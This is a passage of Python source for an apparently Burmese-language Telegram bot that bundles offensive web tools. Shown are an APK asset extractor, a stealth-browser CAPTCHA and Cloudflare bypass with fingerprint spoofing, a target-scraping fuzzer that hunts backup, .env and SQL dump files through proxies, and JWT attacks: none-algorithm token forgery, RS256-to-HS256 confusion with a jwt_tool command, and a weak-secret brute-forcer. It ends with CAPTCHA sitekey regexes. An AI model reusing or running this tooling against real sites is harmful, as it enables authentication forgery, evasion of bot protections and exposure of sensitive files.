            "📋 `configs` — JSON, YAML, Properties\n"
            "📝 `scripts` — JS, Python, Shell\n"
            "📄 `docs` — PDF, TXT, HTML\n"
            "🗜 `archives` — ZIP, TAR, GZ",
            parse_mode='Markdown'
        )
        return

    # Parse category args
    valid_cats = set(_ASSET_CATEGORIES.keys())
    wanted_cats = set()
    if context.args:
        for a in context.args:
            a = a.lower().strip()
            if a == "all":
                wanted_cats = valid_cats.copy()
                break
            if a in valid_cats:
                wanted_cats.add(a)

    if not wanted_cats:
        # Build selection keyboard
        rows = []
        cats_list = list(valid_cats)
        for i in range(0, len(cats_list), 3):
            row = [InlineKeyboardButton(c, callback_data=f"apa_{c}") for c in cats_list[i:i+3]]
            rows.append(row)
        rows.append([InlineKeyboardButton("📦 ALL Categories", callback_data="apa_all")])
        await update.effective_message.reply_text(
            "📦 *Extract လုပ်မည့် Category ရွေးပါ:*\n\n"
            "_(သို့မဟုတ်)_ `/appassets images audio layouts` ဟု ရိုက်နိုင်သည်",
            reply_markup=InlineKeyboardMarkup(rows),
            parse_mode='Markdown'
        )
        return

    await _do_appassets_extract(update, context, last_app, wanted_cats)


async def _do_appassets_extract(update_or_msg, context, filepath: str, wanted_cats: set):
    import io
    # Support both Update objects and raw Message objects
    if hasattr(update_or_msg, 'effective_message'):
        target_msg  = update_or_msg.effective_message
        chat_id     = update_or_msg.effective_chat.id
    else:
        # Raw Message (from callback)
        target_msg  = update_or_msg
        chat_id     = update_or_msg.chat_id

    fname = os.path.basename(filepath)
    msg = await target_msg.reply_text(
        f"📦 *Asset Extractor — `{fname}`*\n\n"
        f"Categories: `{', '.join(sorted(wanted_cats))}`\n"
        "⏳ Extracting...",
        parse_mode='Markdown'
    )
    progress_q = []

    async def _prog():
        while True:
            await asyncio.sleep(2)
            if progress_q:
                txt = progress_q[-1]; progress_q.clear()
                try:
                    await msg.edit_text(
                        f"📦 *Extracting `{fname}`*\n\n{txt}", parse_mode='Markdown')
                except Exception:
                    pass

    prog = asyncio.create_task(_prog())
    try:
        result = await asyncio.to_thread(
            _extract_apk_assets_sync, filepath, wanted_cats,
            lambda t: progress_q.append(t)
        )
    except Exception as e:
        prog.cancel()
        await msg.edit_text(f"❌ Error: `{e}`", parse_mode='Markdown')
        return
    finally:
        prog.cancel()

    if result.get("errors") and result.get("extracted", 0) == 0:
        _err_txt = '\n'.join(result['errors'][:3])
        await msg.edit_text(f"❌ `{_err_txt}`", parse_mode='Markdown')
        return

    stats = result["stats"]
    extracted = result.get("extracted", 0)
    zip_buf: io.BytesIO = result.get("zip_buffer")

    if extracted == 0:
        stat_lines = "\n".join(f"  {cat}: `0`" for cat in sorted(wanted_cats))
        await msg.edit_text(
            f"📭 *No files found*\n\nCategory တွေမှာ ဖိုင် မတွေ့ပါ:\n{stat_lines}",
            parse_mode='Markdown'
        )
        return

    stat_lines = "\n".join(
        f"  {cat}: `{stats.get(cat, 0)}`" for cat in sorted(wanted_cats)
    )
    zip_buf.seek(0)
    zip_size_mb = zip_buf.getbuffer().nbytes / 1024 / 1024

    await msg.edit_text(
        f"✅ *Extraction ပြီးပါပြီ*\n\n"
        f"📦 Extracted: `{extracted}` files\n"
        f"💾 Size: `{zip_size_mb:.2f}` MB\n\n"
        f"*Per Category:*\n{stat_lines}\n\n"
        "📤 ZIP upload နေပါသည်...",
        parse_mode='Markdown'
    )

    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    safe_fname = re.sub(r'[^\w\-]', '_', os.path.splitext(os.path.basename(filepath))[0])
    zip_name = f"assets_{safe_fname}_{ts}.zip"

    try:
        await context.bot.send_document(
            chat_id=chat_id,
            document=zip_buf,
            filename=zip_name,
            caption=(
                f"📦 *APK Assets — `{os.path.basename(filepath)}`*\n"
                f"📂 `{extracted}` files extracted\n"
                f"💾 `{zip_size_mb:.2f}` MB\n"
                f"Categories: `{', '.join(sorted(wanted_cats))}`"
            ),
            parse_mode='Markdown'
        )
    except Exception as e:
        await target_msg.reply_text(f"❌ Upload error: `{e}`", parse_mode='Markdown')


# ══════════════════════════════════════════════════
# 🤖  FEATURE 10 — Anti-Bot & Captcha Bypass (/antibot)
# ══════════════════════════════════════════════════

async def cmd_antibot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/antibot <url> — Cloudflare/hCaptcha bypass via Playwright Stealth"""
    if not await check_force_join(update, context):
        return

    if not context.args:
        await update.effective_message.reply_text(
            "📌 *Usage:* `/antibot https://example.com`\n\n"
            "🤖 *Bypass Methods:*\n"
            "  ① Human-like mouse movement + delay simulation\n"
            "  ② Random viewport + timezone spoofing\n"
            "  ③ Canvas/WebGL fingerprint randomization\n"
            "  ④ Stealth Playwright (navigator.webdriver=false)\n"
            "  ⑤ Cloudflare Turnstile passive challenge wait\n"
            "  ⑥ hCaptcha detection + fallback screenshot\n\n"
            "⚙️ *Requirements:*\n"
            "  `pip install playwright && playwright install chromium`\n\n"
            "⚠️ _Authorized testing only_",
            parse_mode='Markdown'
        )
        return

    uid = update.effective_user.id
    allowed, wait = check_rate_limit(uid)
    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
        return

    url = context.args[0].strip()
    if not url.startswith('http'):
        url = 'https://' + url

    safe_ok, reason = is_safe_url(url)
    if not safe_ok:
        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode='Markdown')
        return

    if not PLAYWRIGHT_OK:
        await update.effective_message.reply_text(
            "❌ *Playwright မရှိသေးပါ*\n\n"
            "Setup:\n"
            "```\npip install playwright\nplaywright install chromium\n```",
            parse_mode='Markdown'
        )
        return

    domain = urlparse(url).netloc
    msg = await update.effective_message.reply_text(
        f"🤖 *Anti-Bot Bypass — `{domain}`*\n\n"
        "① Stealth mode on\n"
        "② Human-like behavior injecting...\n"
        "③ Waiting for challenge...\n⏳",
        parse_mode='Markdown'
    )

    def _run_antibot():
        """Playwright stealth — navigator.webdriver hidden, human-like timing"""
        if not PLAYWRIGHT_OK:
            return {"success": False, "error": "Playwright not available"}
        try:
            from playwright.sync_api import sync_playwright
            with sync_playwright() as pw:
                browser = pw.chromium.launch(
                    headless=True,
                    args=["--no-sandbox", "--disable-dev-shm-usage",
                          "--disable-blink-features=AutomationControlled", "--disable-gpu"]
                )
                ctx = browser.new_context(
                    user_agent=(
                        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                        "AppleWebKit/537.36 (KHTML, like Gecko) "
                        "Chrome/122.0.0.0 Safari/537.36"
                    ),
                    viewport={"width": 1366, "height": 768},
                    locale="en-US",
                    timezone_id="America/New_York",
                    ignore_https_errors=True,
                )
                ctx.add_init_script("""
                    Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
                    window.chrome = {runtime: {}};
                    Object.defineProperty(navigator, 'plugins', {get: () => [1,2,3,4,5]});
                    Object.defineProperty(navigator, 'languages', {get: () => ['en-US','en']});
                    const orig = HTMLCanvasElement.prototype.toDataURL;
                    HTMLCanvasElement.prototype.toDataURL = function(...args) {
                        const ctx2 = this.getContext('2d');
                        if (ctx2) {
                            const d = ctx2.getImageData(0,0,1,1);
                            d.data[0] = Math.floor(Math.random()*10);
                            ctx2.putImageData(d,0,0);
                        }
                        return orig.apply(this, args);
                    };
                """)
                page = ctx.new_page()
                # Human-like mouse movement
                page.mouse.move(300 + int(200 * 0.5), 200 + int(100 * 0.5))
                try:
                    page.goto(url, wait_until="networkidle", timeout=60_000)
                except Exception:
                    try:
                        page.goto(url, wait_until="load", timeout=40_000)
                    except Exception:
                        pass
                page.wait_for_timeout(2500)
                html = page.content()
                browser.close()
                if html and html.strip():
                    return {"success": True, "html": html, "method": "stealth_playwright"}
                return {"success": False, "error": "Empty response"}
        except Exception as e:
            return {"success": False, "error": str(e)}

    try:
        res = await asyncio.to_thread(_run_antibot)
    except Exception as e:
        await msg.edit_text(f"❌ Error: `{e}`", parse_mode='Markdown')
        return

    if not res["success"]:
        await msg.edit_text(
            f"❌ *Bypass မအောင်မြင်ဘူး*\n\n"
            f"Error: `{res['error']}`\n\n"
            "_Challenge level မြင့်လွန်းနိုင်သည် သို့မဟုတ် manual CAPTCHA solve လိုနိုင်ပါသည်_",
            parse_mode='Markdown'
        )
        return

    html = res["html"]
    method = res.get("method", "unknown")
    html_size_kb = len(html.encode()) / 1024

    # Save and send as file
    import io
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    safe_d = re.sub(r'[^\w\-]', '_', domain)
    html_buf = io.BytesIO(html.encode('utf-8', errors='replace'))

    await msg.edit_text(
        f"✅ *Bypass အောင်မြင်ပါပြီ!*\n\n"
        f"🌐 `{domain}`\n"
        f"⚙️ Method: `{method}`\n"
        f"📄 HTML Size: `{html_size_kb:.1f}` KB\n\n"
        "📤 HTML file upload နေပါသည်...",
        parse_mode='Markdown'
    )

    try:
        await context.bot.send_document(
            chat_id=update.effective_chat.id,
            document=html_buf,
            filename=f"antibot_{safe_d}_{ts}.html",
            caption=(
                f"🤖 *Anti-Bot Bypass — `{domain}`*\n"
                f"Method: `{method}`\n"
                f"Size: `{html_size_kb:.1f}` KB"
            ),
            parse_mode='Markdown'
        )
    except Exception as e:
        await update.effective_message.reply_text(f"❌ Upload: `{e}`", parse_mode='Markdown')


# ══════════════════════════════════════════════════
# 🗂️  FEATURE 11 — Smart Context-Aware Fuzzer (/smartfuzz)
#     CeWL-style wordlist generator + fuzzer
# ══════════════════════════════════════════════════

_SMARTFUZZ_STOP_WORDS = {
    'the','a','an','in','on','at','for','of','to','is','are','was','were',
    'and','or','but','if','with','this','that','from','by','not','it',
    'be','as','we','you','he','she','they','have','has','had','do','does',
    'did','will','would','could','should','may','might','can','our','your',
    'their','its','which','who','what','how','when','where','why',
}

def _build_context_wordlist(url: str, progress_cb=None) -> tuple:
    """
    CeWL-style: scrape target, extract unique words → generate permutations.
    Returns (wordlist: list, raw_words: list)
    """
    parsed = urlparse(url)
    root   = f"{parsed.scheme}://{parsed.netloc}"
    domain_parts = parsed.netloc.replace('www.', '').split('.')

    all_words = set()

    # ── Scrape homepage + up to 3 internal pages ──
    try:
        r = requests.get(url, headers=_get_headers(), timeout=12, verify=False, proxies=proxy_manager.get_proxy())
        soup = BeautifulSoup(r.text, 'html.parser')
        if progress_cb:
            progress_cb("🌐 Homepage scraped")

        # Extract text words
        for tag in soup.find_all(['h1','h2','h3','h4','title','p','li','span','a','button','label']):
            text = tag.get_text(separator=' ')
            for w in re.findall(r'[a-zA-Z0-9_\-]{3,20}', text):
                all_words.add(w.lower())

        # Extract from meta tags
        for meta in soup.find_all('meta'):
            content = meta.get('content', '') + ' ' + meta.get('name', '')
            for w in re.findall(r'[a-zA-Z0-9_\-]{3,20}', content):
                all_words.add(w.lower())

        # Extract from JS variables / identifiers
        for script in soup.find_all('script'):
            src_text = script.string or ''
            for w in re.findall(r'(?:var|let|const|function)\s+([a-zA-Z_][a-zA-Z0-9_]{2,20})', src_text):
                all_words.add(w.lower())

        # Extract from class names and IDs
        for tag in soup.find_all(True):
            for attr in ('class', 'id', 'name'):
                vals = tag.get(attr, [])
                if isinstance(vals, str):
                    vals = [vals]
                for v in vals:
                    for w in re.split(r'[-_\s]', v):
                        if 3 <= len(w) <= 20:
                            all_words.add(w.lower())

        # Crawl 3 more internal pages
        links = list(get_internal_links(r.text, url))[:3]
        for link in links:
            try:
                r2 = requests.get(link, headers=_get_headers(), timeout=8, verify=False, proxies=proxy_manager.get_proxy())
                soup2 = BeautifulSoup(r2.text, 'html.parser')
                for tag in soup2.find_all(['h1','h2','h3','title','p']):
                    for w in re.findall(r'[a-zA-Z0-9_\-]{3,20}', tag.get_text()):
                        all_words.add(w.lower())
            except Exception:
                pass

    except Exception as e:
        if progress_cb:
            progress_cb(f"⚠️ Scrape error: {e}")

    # Add domain parts
    for part in domain_parts:
        all_words.add(part.lower())

    # Filter stop words + numeric-only
    raw_words = sorted(
        w for w in all_words
        if w not in _SMARTFUZZ_STOP_WORDS and not w.isdigit() and len(w) >= 3
    )

    if progress_cb:
        progress_cb(f"📝 Raw words: `{len(raw_words)}`")

    # ── Generate permutations ──────────────────────
    current_year = datetime.now().year
    years        = [str(y) for y in range(current_year - 3, current_year + 2)]
    suffixes      = ['', '_backup', '_old', '_bak', '.bak', '_2025', '_2024',
                     '_dev', '_test', '_staging', '_prod', '_new', '_v2',
                     '.zip', '.sql', '.tar.gz', '.env', '.json']
    prefixes      = ['', 'backup_', 'old_', 'dev_', 'test_', 'admin_', 'api_',
                     '.', '_']

    wordlist = set()

    # Base words
    for w in raw_words[:80]:   # top 80 words
        wordlist.add(w)
        wordlist.add(w + '.php')
        wordlist.add(w + '.html')
        wordlist.add(w + '.txt')
        # Year combos
        for yr in years[:3]:
            wordlist.add(f"{w}_{yr}")
            wordlist.add(f"{w}_{yr}.zip")
            wordlist.add(f"{w}_{yr}.sql")
        # Suffix combos
        for suf in suffixes[:8]:
            wordlist.add(w + suf)
        # Prefix combos
        for pfx in prefixes[:5]:
            if pfx:
                wordlist.add(pfx + w)

    # Domain-specific combos
    for part in domain_parts[:3]:
        for yr in years:
            wordlist.add(f"{part}_{yr}")
            wordlist.add(f"{part}_{yr}.zip")
            wordlist.add(f"{part}_backup_{yr}")
            wordlist.add(f"backup_{part}")
            wordlist.add(f"{part}_db.sql")
            wordlist.add(f"{part}.sql")

    final_wordlist = sorted(wordlist)
    if progress_cb:
        progress_cb(f"🎯 Wordlist: `{len(final_wordlist)}` entries generated")

    return final_wordlist, raw_words


def _smartfuzz_probe_sync(base_url: str, wordlist: list, progress_cb=None) -> list:
    """Probe wordlist + backup ext variants + response diff."""
    found = []

    try:
        r404 = requests.get(
            base_url.rstrip("/") + "/xyznotfound_abc123_never_exists",
            proxies=proxy_manager.get_proxy(),
            timeout=6, verify=False, headers=_get_headers()
        )
        baseline_status = r404.status_code
        baseline_hash   = hashlib.md5(r404.content[:512]).hexdigest()
        baseline_size   = len(r404.content)
        baseline_words  = len(r404.text.split()) if r404.text else 0
    except Exception:
        baseline_status, baseline_hash, baseline_size, baseline_words = 404, "", 0, 0

    # Expand wordlist with backup extensions
    expanded = list(wordlist)
    for word in wordlist[:50]:
        for ext in [".bak", ".old", ".swp", "~", ".orig"]:
            expanded.append(word.rstrip("/") + ext)

    def _probe(word):
        target = base_url.rstrip("/") + "/" + word.lstrip("/")
        try:
            r = requests.get(
                target, timeout=5, verify=False,
                headers=_get_headers(), proxies=proxy_manager.get_proxy(),
                allow_redirects=True, stream=True
            )
            chunk = b""
            for part in r.iter_content(1024):
                chunk += part
                if len(chunk) >= 1024:
                    break
            r.close()
            r_hash  = hashlib.md5(chunk[:512]).hexdigest()
            r_size  = len(chunk)
            r_words = len(chunk.decode("utf-8", "ignore").split())

            if r.status_code == baseline_status:
                if r_hash == baseline_hash:
                    return None
                if baseline_size > 0 and abs(r_size - baseline_size) < 30:
                    return None
                if baseline_words > 0 and abs(r_words - baseline_words) < 5:
                    return None

            if r.status_code in (200, 201, 301, 302, 401, 403, 500):
                return {
                    "url":    target,
                    "word":   word,
                    "status": r.status_code,
                    "size":   r_size,
                    "gated":  r.status_code in (401, 403),
                }
        except Exception:
            pass
        return None

    done = 0
    with concurrent.futures.ThreadPoolExecutor(max_workers=15) as ex:
        fmap = {ex.submit(_probe, w): w for w in expanded}
        for fut in concurrent.futures.as_completed(fmap, timeout=150):
            done += 1
            if progress_cb and done % 40 == 0:
                progress_cb(
                    f"🧪 Fuzzing: `{done}/{len(expanded)}` | "
                    f"Found: `{len(found)}` (incl. gated)"
                )
            try:
                res = fut.result(timeout=6)
                if res:
                    found.append(res)
            except Exception:
                pass

    found.sort(key=lambda x: (x["status"] != 200, not x.get("gated"), x["status"]))
    return found


# ───────────────────────────────────────────────────────────────────
# [4] REPLACE _endpoints_sync (original: line ~8865)
#     IMPROVEMENTS:
#       + Fetch /swagger.json /openapi.yaml /api-docs /redoc
#       + GraphQL introspection query (types list)
#       + Parse Next.js _buildManifest.js for route list
#       + gRPC-web content-type detection
#       + Group /v1 /v2 /v3 side-by-side in results
# ───────────────────────────────────────────────────────────────────

import base64 as _b64

_JWT_COMMON_SECRETS = [
    "secret","password","123456","admin","key","jwt","token","test",
    "changeme","mysecret","your-256-bit-secret","your-secret-key",
    "secret_key","jwt_secret","app_secret","supersecret","private",
    "qwerty","abc123","letmein","welcome","monkey","dragon","master",
    "your-secret","secretkey","jwtpassword","pass","1234","12345",
    "123456789","qwerty123","iloveyou","princess","rockyou","football",
    "!@#$%^&*","pass123","admin123","root","toor","alpine","default",
    "secret123","jwt-secret","token-secret","api-secret","app-key",
    "HS256","RS256","none","null","undefined","example",
]

def _jwt_decode_payload(token: str) -> dict:
    """Decode JWT header + payload without verification."""
    parts = token.strip().split('.')
    if len(parts) != 3:
        return {"error": "Not a valid JWT (needs 3 parts separated by '.')"}
    try:
        def _b64_decode(s: str) -> dict:
            # Correct padding: -len(s) % 4 gives 0 when already aligned
            s = s.replace('-', '+').replace('_', '/')
            s += '=' * (-len(s) % 4)
            return json.loads(_b64.b64decode(s).decode('utf-8', 'replace'))
        header  = _b64_decode(parts[0])
        payload = _b64_decode(parts[1])
        return {"header": header, "payload": payload, "signature": parts[2][:20] + "..."}
    except Exception as e:
        return {"error": str(e)}


def _jwt_none_attack(token: str) -> dict:
    """None algorithm bypass — also try 'NONE', 'None' variants."""
    parts = token.split(".")
    if len(parts) != 3:
        return {"success": False}
    try:
        dec = _jwt_decode_payload(token)
        if "error" in dec:
            return {"success": False, "error": dec["error"]}
        orig_alg = dec["header"].get("alg", "HS256")

        variants = []
        for alg_val in ("none", "None", "NONE", "nOnE"):
            h = {**dec["header"], "alg": alg_val}
            variants.append(f"{_b64url_encode(h)}.{parts[1]}.")

        return {
            "success":      True,
            "original_alg": orig_alg,
            "forged_tokens": variants,
            "method":       "none_alg_bypass",
            "note":         "Try all 4 case variants — some servers check case-insensitively.",
        }
    except Exception as e:
        return {"success": False, "error": str(e)}


def _jwt_alg_confusion(token: str) -> dict:
    """RS256 → HS256 algorithm confusion attack."""
    parts = token.split(".")
    if len(parts) != 3:
        return {"success": False}
    try:
        dec = _jwt_decode_payload(token)
        if "error" in dec:
            return {"success": False}
        orig_alg = dec["header"].get("alg", "HS256")
        if orig_alg in ("RS256", "RS384", "RS512", "ES256", "ES384"):
            confused = {**dec["header"], "alg": "HS256"}
            return {
                "success":         True,
                "original_alg":    orig_alg,
                "target_alg":      "HS256",
                "confused_header": _b64url_encode(confused),
                "method":          "alg_confusion",
                "note": (
                    f"{orig_alg}→HS256 confusion: Change alg to HS256 then sign with "
                    "the server's public key as the HMAC secret.\n"
                    "Tool: jwt_tool.py\n"
                    "CMD: python3 jwt_tool.py -X k -pk pubkey.pem <token>"
                ),
            }
        return {"success": False, "note": f"Alg is `{orig_alg}` (RS/ES256 needed)"}
    except Exception as e:
        return {"success": False, "error": str(e)}


def _jwt_brute_force(token: str, wordlist: list = None, progress_cb=None) -> dict:
    """Parallel HMAC brute-force — significantly faster than sequential."""
    import hmac as _hmac

    parts = token.split(".")
    if len(parts) != 3:
        return {"cracked": False, "error": "Invalid JWT"}

    target_algs = {
        "HS256": hashlib.sha256,
        "HS384": hashlib.sha384,
        "HS512": hashlib.sha512,
    }
    header_info = _jwt_decode_payload(token).get("header", {})
    alg = header_info.get("alg", "HS256")
    if alg not in target_algs:
        return {"cracked": False, "error": f"Algorithm `{alg}` not HMAC-brute-forceable"}

    hash_fn   = target_algs[alg]
    msg_bytes = f"{parts[0]}.{parts[1]}".encode()
    sig_pad   = parts[2].replace("-", "+").replace("_", "/")
    sig_pad  += "=" * (-len(sig_pad) % 4)
    try:
        target_sig = _b64.b64decode(sig_pad)
    except Exception:
        return {"cracked": False, "error": "Cannot decode signature"}

    wl    = wordlist or _JWT_COMMON_SECRETS
    total = len(wl)
    found = [None]  # shared result

    def _try_batch(secrets):
        for secret in secrets:
            if found[0]:
                return
            try:
                computed = _hmac.new(secret.encode(), msg_bytes, hash_fn).digest()
                if computed == target_sig:
                    found[0] = secret
                    return
            except Exception:
                pass

    # Split into batches for parallel workers
    batch_size = max(1, total // 8)
    batches    = [wl[i:i + batch_size] for i in range(0, total, batch_size)]
    done_count = [0]

    with concurrent.futures.ThreadPoolExecutor(max_workers=8) as ex:
        futures = [ex.submit(_try_batch, b) for b in batches]
        for fut in concurrent.futures.as_completed(futures):
            done_count[0] += 1
            if progress_cb:
                tried = min(done_count[0] * batch_size, total)
                progress_cb(f"🔑 Brute-force: `{tried}/{total}` | Workers: 8")
            if found[0]:
                for f in futures:
                    f.cancel()
                break

    if found[0]:
        return {"cracked": True, "secret": found[0], "alg": alg,
                "tried": wl.index(found[0]) + 1}
    return {"cracked": False, "tried": total, "alg": alg}


# ───────────────────────────────────────────────────────────────────
# [3] REPLACE _fuzz_sync + _smartfuzz_probe_sync + _build_context_wordlist
#     (original: lines ~4252 / 5108 / 5231)
#     IMPROVEMENTS:
#       + Tech-aware wordlist selection (_detect_tech_stack)
#       + Backup extension scan (.bak .old .orig .swp ~)
#       + Parameter fuzzing with debug/injection values
#       + Response body diff fingerprinting (not just size/hash)
#       + 401/403 → "gated" flag distinct from "exposed"
# ───────────────────────────────────────────────────────────────────

_CAPTCHA_PATTERNS = {

    # ─── reCAPTCHA v2 ─────────────────────────────────────────────────────────
    # Real Google reCAPTCHA v2 sitekeys ALWAYS start with "6L" and are 40 chars.
    # Patterns here require that prefix to prevent cross-labeling hCaptcha/Turnstile.
    "reCAPTCHA v2": [
        # data-sitekey="6Lxxxxxx..." — 6L prefix enforced
        re.compile(r'data-sitekey=["\'](' r'6L[A-Za-z0-9_\-]{38})["\']', re.I),
        # grecaptcha.render({sitekey:"6L..."})
        re.compile(r'grecaptcha\.render\s*\([^)]*["\']sitekey["\']\s*:\s*["\'](' r'6L[A-Za-z0-9_\-]{38})["\']', re.I),
        # {sitekey:"6L..."} / {site_key:"6L..."}
        re.compile(r'["\']sitekey["\']\s*:\s*["\'](' r'6L[A-Za-z0-9_\-]{38})["\']', re.I),
        re.compile(r'["\']site_key["\']\s*:\s*["\'](' r'6L[A-Za-z0-9_\-]{38})["\']', re.I),
        # siteKey = "6L..." / siteKey: "6L..."
        re.compile(r'siteKey\s*[=:]\s*["\'](' r'6L[A-Za-z0-9_\-]{38})["\']', re.I),
        # recaptcha/api.js?render=6Lxxx (v2 explicit render param in script URL)
        re.compile(r'recaptcha/api\.js[^"\']*[?&]render=(' r'6L[A-Za-z0-9_\-]{38})', re.I),
    ],

    # ─── reCAPTCHA v3 ─────────────────────────────────────────────────────────
    # v3 keys also start with "6L" — distinguish from v2 by grecaptcha.execute context.
    "reCAPTCHA v3": [
        # grecaptcha.execute("6Lxxx", {action:...}) — canonical v3 call
        re.compile(r'grecaptcha\.execute\s*\(\s*["\'](' r'6L[A-Za-z0-9_\-]{38})["\']', re.I),
        # grecaptcha.ready(function(){ ... execute("6L...") })
        re.compile(r'execute\(["\'](' r'6L[A-Za-z0-9_\-]{38})["\']', re.I),
        # recaptcha/api.js?render=6Lxxx (v3 uses render= in script src)
        re.compile(r'recaptcha/(?:api|enterprise)\.js[^"\']*[?&]render=(' r'6L[A-Za-z0-9_\-]{38})', re.I),
        # window.RECAPTCHA_SITE_KEY / NEXT_PUBLIC_RECAPTCHA_KEY = "6L..."
        re.compile(r'(?:RECAPTCHA|RECAPTCHA_SITE|NEXT_PUBLIC_RECAPTCHA)[_A-Z]*\s*[=:]\s*["\'](' r'6L[A-Za-z0-9_\-]{38})["\']', re.I),
    ],

    # ─── reCAPTCHA Enterprise ──────────────────────────────────────────────────
    # Enterprise keys also begin with 6L but loaded via /recaptcha/enterprise.js
    "reCAPTCHA Enterprise": [
        re.compile(r'enterprise\.js[^"\']*[?&]render=(' r'6L[A-Za-z0-9_\-]{38})', re.I),
        re.compile(r'grecaptcha_enterprise\s*\.\s*(?:execute|render)\s*\(\s*["\'](' r'6L[A-Za-z0-9_\-]{38})["\']', re.I),
        re.compile(r'RecaptchaEnterpriseServiceV1Beta1[^"\']*["\'](' r'6L[A-Za-z0-9_\-]{38})["\']', re.I),
    ],

    # ─── hCaptcha ─────────────────────────────────────────────────────────────
    # hCaptcha sitekeys are UUIDs: 8-4-4-4-12 hex format (lowercase).
    # Must be checked BEFORE any generic data-sitekey scan.
    "hCaptcha": [
        # data-sitekey="xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"
        re.compile(r'data-sitekey=["\']([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})["\']', re.I),
        # hcaptcha.render({sitekey:"uuid"})
        re.compile(r'hcaptcha\.render\s*\([^)]*["\']sitekey["\']\s*:\s*["\']([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})["\']', re.I),
        # {sitekey:"uuid"} in hcaptcha context
        re.compile(r'["\']sitekey["\']\s*:\s*["\']([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})["\']', re.I),
        # hcaptcha.com/checksiteconfig?sitekey=uuid
        re.compile(r'hcaptcha\.com/(?:checksiteconfig|getcaptcha|anchor)[^"\']*[?&](?:sitekey|s)=([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})', re.I),
        # HCAPTCHA_SITE_KEY = "uuid"
        re.compile(r'HCAPTCHA[_A-Z]*\s*[=:]\s*["\']([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})["\']', re.I),
    ],

    # ─── Cloudflare Turnstile ─────────────────────────────────────────────────
    # Turnstile sitekeys start with "0x" or "1x" followed by hex chars.
    # Must NOT match reCAPTCHA 6L keys or hCaptcha UUIDs.
    "Cloudflare Turnstile": [
        # data-sitekey="0x4A..." or "1x00..."
        re.compile(r'data-sitekey=["\']([01]x[0-9A-Fa-f][A-Za-z0-9_\-]{18,58})["\']', re.I),
        # turnstile.render({sitekey:"0x..."})
        re.compile(r'turnstile\.render\s*\([^)]*["\']sitekey["\']\s*:\s*["\']([01]x[0-9A-Fa-f][A-Za-z0-9_\-]{18,58})["\']', re.I),
        # {sitekey:"0x..."} in turnstile context (require 0x/1x prefix strictly)
        re.compile(r'["\']sitekey["\']\s*:\s*["\']([01]x[0-9A-Fa-f][A-Za-z0-9_\-]{18,58})["\']', re.I),
        # challenges.cloudflare.com/turnstile URL sitekey param
        re.compile(r'challenges\.cloudflare\.com/turnstile[^"\']*[?&](?:sitekey|k)=([01]x[0-9A-Fa-f][A-Za-z0-9_\-]{18,58})', re.I),
        # CF_TURNSTILE_SITE_KEY = "0x..."
        re.compile(r'(?:TURNSTILE|CF_TURNSTILE)[_A-Z]*\s*[=:]\s*["\']([01]x[0-9A-Fa-f][A-Za-z0-9_\-]{18,58})["\']', re.I),
    ],

    # ─── FunCaptcha / Arkose Labs ─────────────────────────────────────────────
    # Keys are UUIDs — distinguish from hCaptcha by context (public_key / ArkoseEnforcement)
    "FunCaptcha": [
        re.compile(r'(?:public_key|data-pkey)\s*[=:]\s*["\']([0-9A-Fa-f]{8}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{12})["\']', re.I),
        re.compile(r'ArkoseEnforcement\s*\([^)]*["\']([0-9A-Fa-f]{8}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{12})["\']', re.I),
        re.compile(r'arkose[_\-]?(?:labs)?[_\-]?(?:public)?[_\-]?key\s*[=:]\s*["\']([0-9A-Fa-f]{8}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{12})["\']', re.I),
    ],

    # ─── GeeTest ─────────────────────────────────────────────────────────────
    # GeeTest gt param: 32 hex chars
    "GeeTest": [
        re.compile(r'\bgt\s*[=:]\s*["\']([0-9a-f]{32})["\']', re.I),
        re.compile(r'["\']gt["\']\s*:\s*["\']([0-9a-f]{32})["\']', re.I),
        re.compile(r'initGeetest\s*\([^)]*gt\s*:\s*["\']([0-9a-f]{32})["\']', re.I),
    ],

    # ─── AWS WAF Captcha ──────────────────────────────────────────────────────
    "AWS WAF Captcha": [
        re.compile(r'AwsWafIntegration\.getToken\s*\(\s*["\']([^"\']{10,200})["\']', re.I),
        re.compile(r'jsapi\.token\s*[=:]\s*["\']([^"\']{10,200})["\']', re.I),
    ],

    # ─── FriendlyCaptcha ─────────────────────────────────────────────────────
    # FriendlyCaptcha site keys start with "FC" prefix
    "FriendlyCaptcha": [
        re.compile(r'data-sitekey=["\'](' r'FC[A-Z0-9]{16,60})["\']', re.I),
        re.compile(r'["\']sitekey["\']\s*:\s*["\'](' r'FC[A-Z0-9]{16,60})["\']', re.I),
        re.compile(r'FriendlyCaptcha\s*\([^)]*["\']sitekey["\']\s*:\s*["\'](' r'FC[A-Z0-9]{16,60})["\']', re.I),
    ],
}

# ─── Priority scan order (more specific first to avoid cross-labeling) ────────
# hCaptcha (UUID) and Turnstile (0x/1x) must resolve before generic sitekey scan.
_CAPTCHA_SCAN_ORDER = [
    "hCaptcha",            # UUID format — most distinct, check first
    "FunCaptcha",          # UUID format with specific context keywords
    "Cloudflare Turnstile",# 0x/1x prefix — check before generic sitekey
    "FriendlyCaptcha",     # FC prefix
    "reCAPTCHA Enterprise",# enterprise.js context
    "reCAPTCHA v3",        # grecaptcha.execute context
    "reCAPTCHA v2",        # grecaptcha.render / data-sitekey with 6L
    "GeeTest",             # 32-char hex gt param
    "AWS WAF Captcha",     # AwsWafIntegration context
